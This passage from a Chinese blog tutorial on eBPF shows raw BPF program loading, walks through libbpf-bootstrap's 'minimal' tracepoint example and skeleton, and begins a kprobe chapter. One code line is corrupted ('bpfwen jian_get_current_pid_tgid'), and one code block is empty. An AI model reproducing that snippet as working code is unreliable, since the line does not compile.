__NR_bpf就是bpf对应的系统调用号, 一切BPF相关操作都通过这个系统调用与内核交互</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">bpf</span><span class="hljs-params">(<span class="hljs-keyword">enum</span> bpf_cmd cmd, <span class="hljs-keyword">union</span> bpf_attr *attr, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size)</span> &#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_bpf, cmd, attr, size);<br>&#125;<br><br><span class="hljs-comment">//用于保存BPF验证器的输出日志</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LOG_BUF_SIZE 0x1000</span><br><span class="hljs-type">char</span> bpf_log_buf[LOG_BUF_SIZE];<br><br><span class="hljs-comment">//通过系统调用, 向内核加载一段BPF指令</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">bpf_prog_load</span><span class="hljs-params">(<span class="hljs-keyword">enum</span> bpf_prog_type type, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> bpf_insn* insns, <span class="hljs-type">int</span> insn_cnt, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* license)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .prog_type = type,        <span class="hljs-comment">//程序类型</span><br>        .insns = ptr_to_u64(insns),    <span class="hljs-comment">//指向指令数组的指针</span><br>        .insn_cnt = insn_cnt,    <span class="hljs-comment">//有多少条指令</span><br>        .license = ptr_to_u64(license),    <span class="hljs-comment">//指向整数字符串的指针</span><br>        .log_buf = ptr_to_u64(bpf_log_buf),    <span class="hljs-comment">//log输出缓冲区</span><br>        .log_size = LOG_BUF_SIZE,    <span class="hljs-comment">//log缓冲区大小</span><br>        .log_level = <span class="hljs-number">2</span>,    <span class="hljs-comment">//log等级</span><br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> bpf(BPF_PROG_LOAD, &amp;attr, <span class="hljs-keyword">sizeof</span>(attr));<br>&#125;<br><br><span class="hljs-comment">//BPF程序就是一个bpf_insn数组, 一个struct bpf_insn代表一条bpf指令</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">bpf_prog</span>[] =</span> &#123;<br>    BPF_RAW_INSN(BPF_ALU64 | BPF_K | BPF_MOV, BPF_REG_0, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0xdeadbeef</span>),<br>    BPF_RAW_INSN(BPF_JMP | BPF_EXIT, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>    <span class="hljs-comment">//加载一个bpf程序</span><br>    <span class="hljs-type">int</span> prog_fd = bpf_prog_load(BPF_PROG_TYPE_KPROBE, bpf_prog, <span class="hljs-keyword">sizeof</span>(bpf_prog)/<span class="hljs-keyword">sizeof</span>(bpf_prog[<span class="hljs-number">0</span>]), <span class="hljs-string">&quot;GPL&quot;</span>);<br>    <span class="hljs-keyword">if</span>(prog_fd&lt;<span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;BPF load prog&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;prog_fd: %d\n&quot;</span>, prog_fd);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, bpf_log_buf);    <span class="hljs-comment">//输出程序日志</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这里我们将日志等级设为最高,然后打印日志即可</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/3801213fb80e7bec0765d0d8692eb9389b506b48.jpg"></p><p><img src="http://imgsrc.baidu.com/forum/pic/item/3801213fb80e7bec0765d0d8692eb9389b506b48.jpg"></p><h2 id="2-使用libbpf-bootstrap来编写eBPF程序"><a href="#2-使用libbpf-bootstrap来编写eBPF程序" class="headerlink" title="2.使用libbpf-bootstrap来编写eBPF程序"></a>2.使用libbpf-bootstrap来编写eBPF程序</h2><p>使用linux内核所提供的宏来编写eBPF程序终究是繁琐的,并且不知如何来调用功能丰富的eBPF-helpers函数,因此我们使用libbpf来帮助我们编写eBPF程序</p><p>这里推荐一个github项目,在方便我们编写程序的同时也提供了许多例子供我们学习</p><p><a href="https://github.com/libbpf/libbpf-bootstrap.git">https://github.com/libbpf/libbpf-bootstrap.git</a></p><p>项目中几个对于其他项目的引用,因此我们需要在clone的仓库中使用下面的指令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git submodule init<br>$ git submodule update<br></code></pre></td></tr></table></figure><p>然后我们可以直接开始通过该项目的README来进行学习</p><h3 id="alpha-minimal"><a href="#alpha-minimal" class="headerlink" title="$\alpha$.minimal"></a>$\alpha$.minimal</h3><p>该程序是一个简单的学习例子,他并不需要BPF CO-RE,他安装了一个每秒都会触发一次的tracepoint handler.并且使用BPF帮助函数<code>bpf_printk</code>来交互.我们可以通过查看文件<code>/sys/kernel/debug/tracing/trace_pipe</code>来观察他的输出</p><p>首先我们就来简简单单看个效果</p><p><img src="/./image-20240228104337801.png" alt="image-20240228104337801"></p><p><img src="/./image-20240228104431792.png" alt="image-20240228104431792"></p><p>那该程序到底做了些什么呢,我们现在来分析程序中的代码</p><h4 id="BPF侧"><a href="#BPF侧" class="headerlink" title="BPF侧"></a>BPF侧</h4><p>该项目使用*.bpf.c来表示该测试程序中BPF侧的代码</p><p>所以我们直接查看<code>minimal.bpf.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-number">1</span> <span class="hljs-comment">// SPDX-License-Identifier: GPL-2.0 OR BSD-3-Clause                 </span><br> <span class="hljs-number">2</span> <span class="hljs-comment">/* Copyright (c) 2020 Facebook */</span><br> <span class="hljs-number">3</span> <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/bpf.h&gt;</span></span><br> <span class="hljs-number">4</span> <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bpf/bpf_helpers.h&gt;</span></span><br> <span class="hljs-number">5</span> <br> <span class="hljs-number">6</span> <span class="hljs-type">char</span> LICENSE[] SEC(<span class="hljs-string">&quot;license&quot;</span>) = <span class="hljs-string">&quot;Dual BSD/GPL&quot;</span>;<br> <span class="hljs-number">7</span> <br> <span class="hljs-number">8</span> <span class="hljs-type">int</span> my_pid = <span class="hljs-number">0</span>;<br> <span class="hljs-number">9</span> <br><span class="hljs-number">10</span> SEC(<span class="hljs-string">&quot;tp/syscalls/sys_enter_write&quot;</span>)<br><span class="hljs-number">11</span> <span class="hljs-type">int</span> <span class="hljs-title function_">handle_tp</span><span class="hljs-params">(<span class="hljs-type">void</span> *ctx)</span><br>12 &#123;<br><span class="hljs-number">13</span>     <span class="hljs-type">int</span> pid = bpfwen jian_get_current_pid_tgid() &gt;&gt; <span class="hljs-number">32</span>;<br><span class="hljs-number">14</span> <br><span class="hljs-number">15</span>     <span class="hljs-keyword">if</span> (pid != my_pid)<br><span class="hljs-number">16</span>         <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-number">17</span> <br><span class="hljs-number">18</span>     bpf_printk(<span class="hljs-string">&quot;BPF triggered from PID %d.\n&quot;</span>, pid);<br><span class="hljs-number">19</span> <br><span class="hljs-number">20</span>     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-number">21</span> &#125;<br></code></pre></td></tr></table></figure><ul><li><code>linux/bpf.h</code>:该文件包含了内核端BPF程序一些所需要的类型和常量</li><li><code>bpf/bpf-helpers.h</code>:该文件由libbpf所提供,包含最常用的宏、常量和 BPF 帮助器定义，几乎每个现有的 BPF 应用程序都会使用它们。上面的 <code>bpf_get_current_pid_tgid()</code> 是此类 BPF 助手的示例</li><li><code>LICENSE</code>: 变量定义 BPF 代码的许可证。指定许可证是强制性的，并且由内核强制执行。某些 BPF 功能对于非 GPL 兼容代码不可用。请注意特殊的 <code>SEC(&quot;license&quot;)</code> 注释</li><li><code>SEC()</code>:（由 <code>bpf_helpers.h</code> 提供）将变量和函数放入指定的部分。 <code>SEC(&quot;license&quot;)</code> 以及其他一些部分名称是 <code>libbpf</code> 规定的约定，因此请确保遵守它.</li><li><code>SEC(&quot;tp/syscalls/sys_enter_write&quot;) int handle_tp(void *ctx) &#123; ... &#125;</code> :该定义将被加载到内核中的 BPF 程序。它在专门命名的部分中表示为普通 C 函数（使用 <code>SEC()</code> 宏）。节名称定义了 libbpf 应创建什么类型的 BPF 程序以及如何&#x2F;将其附加到内核中的位置。在本例中，我们定义了一个跟踪点 BPF 程序，每次从任何用户空间应用程序调用 <code>write()</code> 系统调用时都会调用该程序。</li><li><code>handle_tp</code>:即为tracepoint程序的处理函数,<code>bpf_get_current_pid_tgid</code>返回值的高 32 位中的 PID（或内部内核术语中的“TGID”）。然后它检查触发 <code>write()</code> 系统调用的进程是否是我们的 <code>minimal</code> 进程。这对于繁忙的系统来说非常重要，因为很可能许多不相关的进程都会发出 <code>write()</code> ，这使得按照您自己的方式试验您自己的 BPF 代码变得非常困难。 <code>my_pid</code> 全局变量将使用下面用户空间代码中 <code>minimal</code> 进程的实际 PID 进行初始化。</li><li><code>bpf_printk</code>:该函数来自于bpf_helpers,他相当于BPF程序当中的<code>printf</code>,只不过他将字符串会输出到<code>trace_pipe</code>文件当中</li></ul><h4 id="用户侧"><a href="#用户侧" class="headerlink" title="用户侧"></a>用户侧</h4><p><code>minimal.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// SPDX-License-Identifier: (LGPL-2.1 OR BSD-2-Clause)</span><br><span class="hljs-comment">/* Copyright (c) 2020 Facebook */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/resource.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bpf/libbpf.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;minimal.skel.h&quot;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">libbpf_print_fn</span><span class="hljs-params">(<span class="hljs-keyword">enum</span> libbpf_print_level level, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *format, va_list args)</span><br>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">vfprintf</span>(<span class="hljs-built_in">stderr</span>, format, args);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">minimal_bpf</span> *<span class="hljs-title">skel</span>;</span><br>        <span class="hljs-type">int</span> err;<br><br>        <span class="hljs-comment">/* Set up libbpf errors and debug info callback */</span><br>        libbpf_set_print(libbpf_print_fn);<br><br>        <span class="hljs-comment">/* Open BPF application */</span><br>        skel = minimal_bpf__open();<br>        <span class="hljs-keyword">if</span> (!skel) &#123;<br>                <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Failed to open BPF skeleton\n&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br><br>        <span class="hljs-comment">/* ensure BPF program only handles write() syscalls from our process */</span><br>        skel-&gt;bss-&gt;my_pid = getpid();<br><br>        <span class="hljs-comment">/* Load &amp; verify BPF programs */</span><br>        err = minimal_bpf__load(skel);<br>        <span class="hljs-keyword">if</span> (err) &#123;<br>                <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Failed to load and verify BPF skeleton\n&quot;</span>);<br>                <span class="hljs-keyword">goto</span> cleanup;<br>        &#125;<br><br>        <span class="hljs-comment">/* Attach tracepoint handler */</span><br>        err = minimal_bpf__attach(skel);<br>        <span class="hljs-keyword">if</span> (err) &#123;<br>                <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Failed to attach BPF skeleton\n&quot;</span>);<br>                <span class="hljs-keyword">goto</span> cleanup;<br>        &#125;<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Successfully started! Please run `sudo cat /sys/kernel/debug/tracing/trace_pipe` &quot;</span><br>               <span class="hljs-string">&quot;to see output of the BPF programs.\n&quot;</span>);<br><br>        <span class="hljs-keyword">for</span> (;;) &#123;<br>                <span class="hljs-comment">/* trigger our BPF program */</span><br>                <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;.&quot;</span>);<br>                sleep(<span class="hljs-number">1</span>);<br>        &#125;<br><br>cleanup:<br>        minimal_bpf__destroy(skel);<br>        <span class="hljs-keyword">return</span> -err;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先该文件包含了一个<code>minimal.skel.h</code>文件,它是由Makefile在编译过程中使用bpftool生成的,其中包括<code>minimal.bpf.c</code>的代码框架,因此只需要在用户端程序中包含该编译好的bpf程序骨架即可成功运行,下面是<code>minimal.bpf.c</code>的高级框架表示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* SPDX-License-Identifier: (LGPL-2.1 OR BSD-2-Clause) */</span><br><br><span class="hljs-comment">/* THIS FILE IS AUTOGENERATED! */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __MINIMAL_BPF_SKEL_H__</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __MINIMAL_BPF_SKEL_H__</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bpf/libbpf.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">minimal_bpf</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_object_skeleton</span> *<span class="hljs-title">skeleton</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_object</span> *<span class="hljs-title">obj</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span> *<span class="hljs-title">bss</span>;</span><br>&#125; maps;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_program</span> *<span class="hljs-title">handle_tp</span>;</span><br>&#125; progs;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_link</span> *<span class="hljs-title">handle_tp</span>;</span><br>&#125; links;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">minimal_bpf__bss</span> &#123;</span><br><span class="hljs-type">int</span> my_pid;<br>&#125; *bss;<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">minimal_bpf__destroy</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> minimal_bpf *obj)</span> &#123; ... &#125;<br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">struct</span> minimal_bpf *<span class="hljs-title function_">minimal_bpf__open_opts</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> bpf_object_open_opts *opts)</span> &#123; ... &#125;<br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">struct</span> minimal_bpf *<span class="hljs-title function_">minimal_bpf__open</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123; ... &#125;<br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">minimal_bpf__load</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> minimal_bpf *obj)</span> &#123; ... &#125;<br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">struct</span> minimal_bpf *<span class="hljs-title function_">minimal_bpf__open_and_load</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123; ... &#125;<br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">minimal_bpf__attach</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> minimal_bpf *obj)</span> &#123; ... &#125;<br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">minimal_bpf__detach</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> minimal_bpf *obj)</span> &#123; ... &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* __MINIMAL_BPF_SKEL_H__ */</span></span><br></code></pre></td></tr></table></figure><p>它具有可以传递给 libbpf API 函数的 <code>struct bpf_object *obj;</code> 。它还具有 <code>maps</code> 、 <code>progs</code> 和 <code>links</code> “部分”，可直接访问 BPF 代码中定义的 BPF 映射和程序（例如 <code>handle_tp</code> BPF 程序）。这些引用可以直接传递到 libbpf API，以使用 BPF 映射&#x2F;程序&#x2F;链接执行额外操作。 Skeleton 还可以选择具有 <code>bss</code> 、 <code>data</code> 和 <code>rodata</code> 部分，允许从用户空间直接（不需要额外的系统调用）访问 BPF 全局变量。在本例中，我们的 <code>my_pid</code> BPF 变量对应于 <code>bss-&gt;my_pid</code> 字段。</p><p>然后我们回过头来查看我们bpf用户侧的代码,先从main函数开始看起</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">libbpf_print_fn</span><span class="hljs-params">(<span class="hljs-keyword">enum</span> libbpf_print_level level, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *format, va_list args)</span><br>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">vfprintf</span>(<span class="hljs-built_in">stderr</span>, format, args);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">minimal_bpf</span> *<span class="hljs-title">skel</span>;</span><br>        <span class="hljs-type">int</span> err;<br><br>        <span class="hljs-comment">/* Set up libbpf errors and debug info callback */</span><br>        libbpf_set_print(libbpf_print_fn);<br></code></pre></td></tr></table></figure><p>其中<code>libbpf_set_print</code>函数为所有libpf日志提供自定义回调函数,这里是用户自定的仅输出错误的日志函数,我们可以发现在libbpf下的bpf_helper.c函数中也同该<code>libbpf_print_fn</code>大差不差</p><p>这里在minimal的情况下他仅仅将所有日志都发送给标准错误,然后我们接着向下分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Open BPF application */</span><br>skel = minimal_bpf__open();<br></code></pre></td></tr></table></figure><p>这里调用了通过 <code>minimal.skel.h</code>文件中所定义的函数<code>minimal_bpf__open</code>,他实际上是一个wrapper,调用了 <code>minimal_bpf__open_opts(NULL)</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">52</span> <span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">minimal_bpf</span> *</span><br><span class="hljs-class">53 <span class="hljs-title">minimal_bpf__open_opts</span>(<span class="hljs-title">const</span> <span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_object_open_opts</span> *<span class="hljs-title">opts</span>)</span><br><span class="hljs-class">54 &#123;</span>                                                                   <br><span class="hljs-number">55</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">minimal_bpf</span> *<span class="hljs-title">obj</span>;</span><br><span class="hljs-number">56</span>     <span class="hljs-type">int</span> err;<br><span class="hljs-number">57</span> <br><span class="hljs-number">58</span>     obj = (<span class="hljs-keyword">struct</span> minimal_bpf *)<span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-keyword">sizeof</span>(*obj));<br><span class="hljs-number">59</span>     <span class="hljs-keyword">if</span> (!obj) &#123;<br><span class="hljs-number">60</span>         errno = ENOMEM;<br><span class="hljs-number">61</span>         <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-number">62</span>     &#125;<br><span class="hljs-number">63</span> <br><span class="hljs-number">64</span>     err = minimal_bpf__create_skeleton(obj);<br><span class="hljs-number">65</span>     <span class="hljs-keyword">if</span> (err)<br><span class="hljs-number">66</span>         <span class="hljs-keyword">goto</span> err_out;<br><span class="hljs-number">67</span> <br><span class="hljs-number">68</span>     err = bpf_object__open_skeleton(obj-&gt;skeleton, opts);<br><span class="hljs-number">69</span>     <span class="hljs-keyword">if</span> (err)<br><span class="hljs-number">70</span>         <span class="hljs-keyword">goto</span> err_out;<br><span class="hljs-number">71</span> <br><span class="hljs-number">72</span>     <span class="hljs-keyword">return</span> obj;<br><span class="hljs-number">73</span> err_out:<br><span class="hljs-number">74</span>     minimal_bpf__destroy(obj);<br><span class="hljs-number">75</span>     errno = -err;<br><span class="hljs-number">76</span>     <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-number">77</span> &#125;<br><br></code></pre></td></tr></table></figure><p>然后调用 <code>minimal_bpf__create_skeleton</code>函数来搭建框架,主要是填满下面这个结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1653</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_object_skeleton</span> &#123;</span><br><span class="hljs-number">1654</span>     <span class="hljs-type">size_t</span> sz; <span class="hljs-comment">/* size of this struct, for forward/backward compatibility */</span><br><span class="hljs-number">1655</span> <br><span class="hljs-number">1656</span>     <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name;<br><span class="hljs-number">1657</span>     <span class="hljs-type">const</span> <span class="hljs-type">void</span> *data;<br><span class="hljs-number">1658</span>     <span class="hljs-type">size_t</span> data_sz;<br><span class="hljs-number">1659</span> <br><span class="hljs-number">1660</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_object</span> **<span class="hljs-title">obj</span>;</span><br><span class="hljs-number">1661</span> <br><span class="hljs-number">1662</span>     <span class="hljs-type">int</span> map_cnt;<br><span class="hljs-number">1663</span>     <span class="hljs-type">int</span> map_skel_sz; <span class="hljs-comment">/* sizeof(struct bpf_map_skeleton) */</span><br><span class="hljs-number">1664</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map_skeleton</span> *<span class="hljs-title">maps</span>;</span><br><span class="hljs-number">1665</span> <br><span class="hljs-number">1666</span>     <span class="hljs-type">int</span> prog_cnt;<br><span class="hljs-number">1667</span>     <span class="hljs-type">int</span> prog_skel_sz; <span class="hljs-comment">/* sizeof(struct bpf_prog_skeleton) */</span><br><span class="hljs-number">1668</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_prog_skeleton</span> *<span class="hljs-title">progs</span>;</span><br><span class="hljs-number">1669</span> &#125;;<br></code></pre></td></tr></table></figure><p>然后调用<code>bpf_object__open_skeleton</code>函数</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><h1 id="第五章：瓜玛"><a href="#第五章：瓜玛" class="headerlink" title="第五章：瓜玛"></a>第五章：瓜玛</h1><p>本章节来讲一讲eBPF几种程序类型的一个基础知识,分别是kprobe,uprobe,tracepoint</p><p>本章节内容大部分来自对于官方文档的学习</p><h2 id="1-Kprobe"><a href="#1-Kprobe" class="headerlink" title="1.Kprobe"></a>1.Kprobe</h2><h3 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念"></a>1.概念</h3><p>Kprobe允许我们可以动态的在内核运行过程中打上断点,并且可以搜集这些调试信息.我们甚至几乎可以对任何内核代码地址进行跟踪调试(有一些内核代码无法被追踪,他被维护成一个黑名单,可以查看kprobes_blacklist)</p><p>存在两种probes:kprobes和kretprobes(后面也被叫做return probes),一个kprobe几乎能插入到内核中的任何指令当中.一个return probe只有在指定的函数返回时才会其作用</p><p>在典型的例子当中,基于kprobes的指令被打包成一个内核模块,该模块的init函数安装(或者说叫注册)了一个或多个probes,并且在exit函数当中卸载他们.一个注册函数诸如<code>register_kprobe()</code>指定了该probe插入到那里并且当该probe被命中会调用哪个handler</p><p>在下面几个章节来介绍kprobe的工作原理,如果您迫切要立即使用kprobes,那么可以去查看<code>kprobe_archs_supported</code>文档</p><h3 id="2-Kprobe工作原理"><a href="#2-Kprobe工作原理" class="headerlink" 